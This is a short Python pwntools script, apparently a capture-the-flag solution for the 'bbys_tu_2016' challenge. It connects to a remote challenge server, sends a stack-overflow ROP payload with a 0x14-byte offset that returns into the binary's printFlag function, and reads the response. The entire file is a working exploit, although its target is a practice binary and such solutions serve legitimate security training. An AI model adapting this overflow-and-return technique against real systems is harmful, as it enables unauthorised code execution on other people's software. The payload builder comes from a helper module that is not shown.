from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 29181)

elf = ELF('../bbys_tu_2016')
libc = ELF('../libc-2.23.so')

# Distance to EBP given by IDA is incorrect. Need to manually debug.
print_flag = elf.sym['printFlag']
payload = utils.create_rop_payload(0x14, {}, 'i386', print_flag)

target.sendline(payload)
target.recv(100)